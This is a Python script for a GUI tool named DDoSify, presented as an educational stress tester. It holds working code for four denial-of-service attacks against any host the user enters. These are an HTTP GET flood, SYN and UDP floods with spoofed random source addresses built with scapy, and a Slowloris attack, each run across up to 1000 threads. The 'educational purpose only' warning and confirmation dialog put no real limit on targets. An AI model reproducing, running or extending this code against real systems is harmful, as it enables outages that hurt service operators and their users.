#!/usr/bin/env python3
"""
DDoSify GUI - Network Stress Testing Tool
Professional GUI for educational DDoS simulation
Author: Security Research
"""

import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
import threading
import time
import socket
import random
import sys
import os
from scapy.all import *
import requests
from urllib.parse import urlparse
import psutil

class DDoSifyGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("DDoSify - Network Stress Testing Tool")
        self.root.geometry("900x700")
        self.root.resizable(False, False)
        
        # Variables
        self.is_attacking = False
        self.attack_thread = None
        self.stats_thread = None
        self.ddos = None
        self.start_time = None
        
        # Statistics
        self.packets_sent = 0
        self.connections_made = 0
        self.current_rate = 0
        
        # Setup GUI
        self.setup_theme()
        self.create_widgets()
        self.center_window()
        
        # Load configuration
        self.load_config()
    
    def setup_theme(self):
        """Setup dark theme for the GUI"""
        self.root.configure(bg='#1e1e1e')
        style = ttk.Style()
        style.theme_use('clam')
        
        # Configure dark theme colors
        style.configure('TFrame', background='#2d2d2d')
        style.configure('TLabel', background='#2d2d2d', foreground='white')
        style.configure('TButton', background='#404040', foreground='white')
        style.map('TButton', background=[('active', '#505050')])
        style.configure('TCombobox', fieldbackground='#404040', background='#404040', foreground='white')
        style.configure('TEntry', fieldbackground='#404040', foreground='white')
        style.configure('TRadiobutton', background='#2d2d2d', foreground='white')
    
    def create_widgets(self):
        """Create all GUI widgets"""
        # Main container
        main_frame = ttk.Frame(self.root, padding="10")
        main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        # Title
        title_label = tk.Label(main_frame, text="DDoSify - Network Stress Testing Tool", 
                           font=("Arial", 16, "bold"), bg='#1e1e1e', fg='#ff4444')
        title_label.grid(row=0, column=0, columnspan=3, pady=(0, 20))
        
        # Warning
        warning_label = tk.Label(main_frame, 
                              text="Educational Purpose Only - Use Only on Networks You Own",
                              font=("Arial", 10, "bold"), bg='#1e1e1e', fg='#ffff00')
        warning_label.grid(row=1, column=0, columnspan=3, pady=(0, 20))
        
        # Target Configuration
        target_frame = ttk.LabelFrame(main_frame, text="Target Configuration", padding="10")
        target_frame.grid(row=2, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=(0, 10))
        
        tk.Label(target_frame, text="Target IP/Hostname:", bg='#2d2d2d', fg='white').grid(row=0, column=0, sticky=tk.W)
        self.target_var = tk.StringVar()
        self.target_entry = ttk.Entry(target_frame, textvariable=self.target_var, width=25)
        self.target_entry.grid(row=0, column=1, sticky=(tk.W, tk.E), padx=(10, 0))
        
        tk.Label(target_frame, text="Port:", bg='#2d2d2d', fg='white').grid(row=0, column=2, sticky=tk.W, padx=(20, 0))
        self.port_var = tk.StringVar(value="80")
        self.port_entry = ttk.Entry(target_frame, textvariable=self.port_var, width=8)
        self.port_entry.grid(row=0, column=3, sticky=tk.W, padx=(5, 0))
        
        test_btn = ttk.Button(target_frame, text="Test Connection", command=self.test_connection)
        test_btn.grid(row=0, column=4, padx=(20, 0))
        
        # Attack Method Selection
        method_frame = ttk.LabelFrame(main_frame, text="Attack Method", padding="10")
        method_frame.grid(row=3, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=(0, 10))
        
        self.method_var = tk.StringVar(value="http")
        
        methods = [
            ("HTTP Flood", "http", "Layer 7 - HTTP GET requests"),
            ("SYN Flood", "syn", "Layer 4 - TCP SYN packets (requires root)"),
            ("UDP Flood", "udp", "Layer 4 - UDP packets (requires root)"),
            ("Slowloris", "slowloris", "Layer 7 - Slow HTTP headers")
        ]
        
        for i, (text, value, desc) in enumerate(methods):
            rb = ttk.Radiobutton(method_frame, text=text, variable=self.method_var, 
                              value=value)
            rb.grid(row=i, column=0, sticky=tk.W)
            
            desc_label = tk.Label(method_frame, text=desc, bg='#2d2d2d', fg='#888888', font=("Arial", 8))
            desc_label.grid(row=i, column=1, sticky=tk.W, padx=(10, 0))
        
        # Attack Parameters
        params_frame = ttk.LabelFrame(main_frame, text="Attack Parameters", padding="10")
        params_frame.grid(row=4, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=(0, 10))
        
        tk.Label(params_frame, text="Threads:", bg='#2d2d2d', fg='white').grid(row=0, column=0, sticky=tk.W)
        self.threads_var = tk.StringVar(value="50")
        self.threads_spinbox = ttk.Spinbox(params_frame, from_=1, to=1000, textvariable=self.threads_var, width=10)
        self.threads_spinbox.grid(row=0, column=1, sticky=tk.W, padx=(10, 0))
        
        tk.Label(params_frame, text="Duration (seconds):", bg='#2d2d2d', fg='white').grid(row=0, column=2, sticky=tk.W, padx=(20, 0))
        self.duration_var = tk.StringVar(value="60")
        self.duration_spinbox = ttk.Spinbox(params_frame, from_=10, to=300, textvariable=self.duration_var, width=10)
        self.duration_spinbox.grid(row=0, column=3, sticky=tk.W, padx=(10, 0))
        
        # Control Buttons
        control_frame = ttk.Frame(main_frame)
        control_frame.grid(row=5, column=0, columnspan=3, pady=(0, 10))
        
        self.start_btn = ttk.Button(control_frame, text="Start Attack", command=self.start_attack, 
                                  width=15)
        self.start_btn.grid(row=0, column=0, padx=(0, 5))
        
        self.stop_btn = ttk.Button(control_frame, text="Stop Attack", command=self.stop_attack, 
                                 width=15, state="disabled")
        self.stop_btn.grid(row=0, column=1, padx=(5, 0))
        
        clear_btn = ttk.Button(control_frame, text="Clear Log", command=self.clear_log, width=15)
        clear_btn.grid(row=0, column=2, padx=(5, 0))
        
        # Statistics Display
        stats_frame = ttk.LabelFrame(main_frame, text="Live Statistics", padding="10")
        stats_frame.grid(row=6, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=(0, 10))
        
        # Stats labels
        self.packets_label = tk.Label(stats_frame, text="Packets Sent: 0", bg='#2d2d2d', fg='#00ff00', 
                                    font=("Arial", 12, "bold"))
        self.packets_label.grid(row=0, column=0, sticky=tk.W, padx=(0, 20))
        
        self.rate_label = tk.Label(stats_frame, text="Rate: 0/s", bg='#2d2d2d', fg='#00ffff', 
                                 font=("Arial", 12, "bold"))
        self.rate_label.grid(row=0, column=1, sticky=tk.W, padx=(0, 20))
        
        self.time_label = tk.Label(stats_frame, text="Time: 0s", bg='#2d2d2d', fg='#ffff00', 
                                 font=("Arial", 12, "bold"))
        self.time_label.grid(row=0, column=2, sticky=tk.W)
        
        self.threads_label = tk.Label(stats_frame, text="Active Threads: 0", bg='#2d2d2d', fg='#ff8800', 
                                     font=("Arial", 12, "bold"))
        self.threads_label.grid(row=1, column=0, sticky=tk.W, pady=(10, 0))
        
        self.connections_label = tk.Label(stats_frame, text="Connections: 0", bg='#2d2d2d', fg='#ff00ff', 
                                       font=("Arial", 12, "bold"))
        self.connections_label.grid(row=1, column=1, sticky=tk.W, pady=(10, 0))
        
        self.status_label = tk.Label(stats_frame, text="Status: Ready", bg='#2d2d2d', fg='#ffffff', 
                                   font=("Arial", 12, "bold"))
        self.status_label.grid(row=1, column=2, sticky=tk.W, pady=(10, 0))
        
        # Log Display
        log_frame = ttk.LabelFrame(main_frame, text="Attack Log", padding="10")
        log_frame.grid(row=7, column=0, columnspan=3, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        self.log_text = scrolledtext.ScrolledText(log_frame, height=12, width=80, 
                                                bg='#1a1a1a', fg='#00ff00', 
                                                font=("Consolas", 9))
        self.log_text.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        # Configure grid weights
        main_frame.columnconfigure(1, weight=1)
        target_frame.columnconfigure(1, weight=1)
        log_frame.columnconfigure(0, weight=1)
        log_frame.rowconfigure(0, weight=1)
    
    def center_window(self):
        """Center the window on screen"""
        self.root.update_idletasks()
        width = self.root.winfo_width()
        height = self.root.winfo_height()
        x = (self.root.winfo_screenwidth() // 2) - (width // 2)
        y = (self.root.winfo_screenheight() // 2) - (height // 2)
        self.root.geometry(f'{width}x{height}+{x}+{y}')
    
    def load_config(self):
        """Load default configuration"""
        # Set some sensible defaults
        self.target_var.set("127.0.0.1")  # Localhost for testing
        self.port_var.set("80")
        self.threads_var.set("50")
        self.duration_var.set("60")
        self.method_var.set("http")
    
    def test_connection(self):
        """Test if target is reachable"""
        target = self.target_var.get()
        port = int(self.port_var.get())
        
        if not target:
            messagebox.showwarning("Warning", "Please enter a target IP/hostname")
            return
        
        self.log_message(f"Testing connection to {target}:{port}...")
        
        def test_worker():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                result = sock.connect_ex((target, port))
                sock.close()
                
                if result == 0:
                    self.root.after(0, lambda: self.log_message(f"Target {target}:{port} is reachable", "success"))
                else:
                    self.root.after(0, lambda: self.log_message(f"Target {target}:{port} is not reachable", "error"))
                    
            except Exception as e:
                self.root.after(0, lambda: self.log_message(f"Connection test failed: {e}", "error"))
        
        threading.Thread(target=test_worker, daemon=True).start()
    
    def validate_inputs(self):
        """Validate user inputs"""
        if not self.target_var.get():
            messagebox.showwarning("Warning", "Please enter a target IP/hostname")
            return False
        
        try:
            port = int(self.port_var.get())
            if not (1 <= port <= 65535):
                messagebox.showerror("Error", "Port must be between 1 and 65535")
                return False
        except ValueError:
            messagebox.showerror("Error", "Invalid port number")
            return False
        
        try:
            threads = int(self.threads_var.get())
            if not (1 <= threads <= 1000):
                messagebox.showerror("Error", "Threads must be between 1 and 1000")
                return False
        except ValueError:
            messagebox.showerror("Error", "Invalid thread count")
            return False
        
        try:
            duration = int(self.duration_var.get())
            if not (10 <= duration <= 300):
                messagebox.showerror("Error", "Duration must be between 10 and 300 seconds")
                return False
        except ValueError:
            messagebox.showerror("Error", "Invalid duration")
            return False
        
        # Check for root privileges on certain methods
        method = self.method_var.get()
        if method in ["syn", "udp"] and os.geteuid() != 0:
            messagebox.showerror("Error", f"{method.upper()} attacks require root privileges. Run as administrator.")
            return False
        
        return True
    
    def start_attack(self):
        """Start the DDoS attack"""
        if not self.validate_inputs():
            return
        
        # Safety confirmation
        result = messagebox.askyesno("Confirm Attack", 
                                     "This is a network stress testing tool for educational purposes only.\n"
                                     "Only use on networks you own or have explicit permission to test.\n\n"
                                     "Do you understand and accept responsibility?")
        if not result:
            return
        
        # Reset statistics
        self.packets_sent = 0
        self.connections_made = 0
        self.start_time = time.time()
        
        # Update UI
        self.is_attacking = True
        self.start_btn.config(state="disabled")
        self.stop_btn.config(state="normal")
        self.status_label.config(text="Status: Attacking", fg='#ff0000')
        
        # Get parameters
        target = self.target_var.get()
        port = int(self.port_var.get())
        threads = int(self.threads_var.get())
        duration = int(self.duration_var.get())
        method = self.method_var.get()
        
        self.log_message(f"Starting {method.upper()} attack on {target}:{port}")
        self.log_message(f"Threads: {threads} | Duration: {duration}s")
        
        # Start attack in background thread
        self.attack_thread = threading.Thread(target=self.run_attack, 
                                            args=(method, target, port, threads, duration),
                                            daemon=True)
        self.attack_thread.start()
        
        # Start statistics update thread
        self.stats_thread = threading.Thread(target=self.update_statistics, daemon=True)
        self.stats_thread.start()
    
    def stop_attack(self):
        """Stop the DDoS attack"""
        self.is_attacking = False
        
        # Update UI
        self.start_btn.config(state="normal")
        self.stop_btn.config(state="disabled")
        self.status_label.config(text="Status: Stopping...", fg='#ffff00')
        
        # Wait for threads to finish
        if self.attack_thread and self.attack_thread.is_alive():
            self.attack_thread.join(timeout=2)
        
        # Show final statistics
        if self.start_time:
            elapsed = time.time() - self.start_time
            avg_rate = self.packets_sent / elapsed if elapsed > 0 else 0
            
            self.log_message("=" * 50)
            self.log_message("Attack stopped")
            self.log_message(f"Total packets sent: {self.packets_sent:,}")
            self.log_message(f"Total connections: {self.connections_made:,}")
            self.log_message(f"Average rate: {avg_rate:.2f} packets/second")
            self.log_message(f"Duration: {elapsed:.2f} seconds")
            self.log_message("=" * 50)
        
        self.status_label.config(text="Status: Ready", fg='#ffffff')
    
    def run_attack(self, method, target, port, threads, duration):
        """Run the actual attack"""
        try:
            if method == "http":
                self.http_flood(target, port, threads, duration)
            elif method == "syn":
                self.syn_flood(target, port, threads, duration)
            elif method == "udp":
                self.udp_flood(target, port, threads, duration)
            elif method == "slowloris":
                self.slowloris(target, port, threads, duration)
        except Exception as e:
            self.log_message(f"Attack error: {e}", "error")
        finally:
            self.root.after(0, self.stop_attack)
    
    def http_flood(self, target, port, threads, duration):
        """HTTP GET flood attack"""
        def worker():
            while self.is_attacking:
                try:
                    url = f"http://{target}:{port}/"
                    headers = {
                        'User-Agent': random.choice([
                            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
                            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
                        ]),
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    }
                    
                    response = requests.get(url, headers=headers, timeout=5)
                    self.packets_sent += 1
                    
                except:
                    self.packets_sent += 1
                
                time.sleep(0.01)
        
        # Start threads
        for _ in range(threads):
            if self.is_attacking:
                thread = threading.Thread(target=worker, daemon=True)
                thread.start()
    
    def syn_flood(self, target, port, threads, duration):
        """SYN flood attack"""
        def worker():
            while self.is_attacking:
                try:
                    ip_layer = IP(src=RandIP(), dst=target)
                    tcp_layer = TCP(sport=RandShort(), dport=port, flags="S")
                    packet = ip_layer / tcp_layer
                    
                    send(packet, verbose=False)
                    self.packets_sent += 1
                    
                except:
                    pass
                
                time.sleep(0.001)
        
        # Start threads
        for _ in range(threads):
            if self.is_attacking:
                thread = threading.Thread(target=worker, daemon=True)
                thread.start()
    
    def udp_flood(self, target, port, threads, duration):
        """UDP flood attack"""
        def worker():
            while self.is_attacking:
                try:
                    ip_layer = IP(src=RandIP(), dst=target)
                    udp_layer = UDP(sport=RandShort(), dport=port)
                    payload = random.randbytes(random.randint(1, 1024))
                    packet = ip_layer / udp_layer / payload
                    
                    send(packet, verbose=False)
                    self.packets_sent += 1
                    
                except:
                    pass
                
                time.sleep(0.001)
        
        # Start threads
        for _ in range(threads):
            if self.is_attacking:
                thread = threading.Thread(target=worker, daemon=True)
                thread.start()
    
    def slowloris(self, target, port, threads, duration):
        """Slowloris attack"""
        def worker():
            while self.is_attacking:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(10)
                    sock.connect((target, port))
                    
                    sock.send(b"GET /" + str(random.randint(1, 1000)).encode() + b" HTTP/1.1\r\n")
                    sock.send(b"Host: " + target.encode() + b"\r\n")
                    sock.send(b"User-Agent: " + random.choice([
                        b"Mozilla/5.0", b"Chrome/91.0", b"Firefox/89.0"
                    ]) + b"\r\n")
                    
                    for _ in range(50):
                        if not self.is_attacking:
                            break
                        sock.send(b"X-" + random.randbytes(10).hex().encode() + b": a\r\n")
                        self.packets_sent += 1
                        time.sleep(5)
                    
                    sock.close()
                    self.connections_made += 1
                    
                except:
                    pass
        
        # Start threads
        for _ in range(threads):
            if self.is_attacking:
                thread = threading.Thread(target=worker, daemon=True)
                thread.start()
    
    def update_statistics(self):
        """Update statistics display"""
        while self.is_attacking:
            if self.start_time:
                elapsed = time.time() - self.start_time
                rate = self.packets_sent / elapsed if elapsed > 0 else 0
                
                self.root.after(0, self.update_stats_display, elapsed, rate)
            
            time.sleep(1)
    
    def update_stats_display(self, elapsed, rate):
        """Update statistics labels"""
        self.packets_label.config(text=f"Packets Sent: {self.packets_sent:,}")
        self.rate_label.config(text=f"Rate: {rate:.2f}/s")
        self.time_label.config(text=f"Time: {elapsed:.1f}s")
        self.connections_label.config(text=f"Connections: {self.connections_made:,}")
        
        # Count active threads
        active_threads = threading.active_count() - 2  # Subtract main and stats thread
        self.threads_label.config(text=f"Active Threads: {active_threads}")
    
    def log_message(self, message, level="info"):
        """Add message to log"""
        timestamp = time.strftime("%H:%M:%S")
        
        # Color based on level
        if level == "success":
            color = "#00ff00"
        elif level == "error":
            color = "#ff4444"
        elif level == "warning":
            color = "#ffff00"
        else:
            color = "#ffffff"
        
        self.log_text.insert(tk.END, f"[{timestamp}] {message}\n", color)
        self.log_text.see(tk.END)
        self.root.update_idletasks()
    
    def clear_log(self):
        """Clear the log display"""
        self.log_text.delete(1.0, tk.END)
        self.log_message("Log cleared")
    
    def on_closing(self):
        """Handle window closing"""
        if self.is_attacking:
            if messagebox.askokcancel("Quit", "Attack is running. Stop and quit?"):
                self.stop_attack()
                self.root.after(1000, self.root.destroy)
        else:
            self.root.destroy()

def main():
    """Main function"""
    # Check for admin privileges for certain attacks
    if os.geteuid() != 0:
        print("Note: Some attack methods require administrator privileges")
    
    # Create GUI
    root = tk.Tk()
    app = DDoSifyGUI(root)
    
    # Handle window closing
    root.protocol("WM_DELETE_WINDOW", app.on_closing)
    
    # Start GUI
    root.mainloop()

if __name__ == "__main__":
    main()
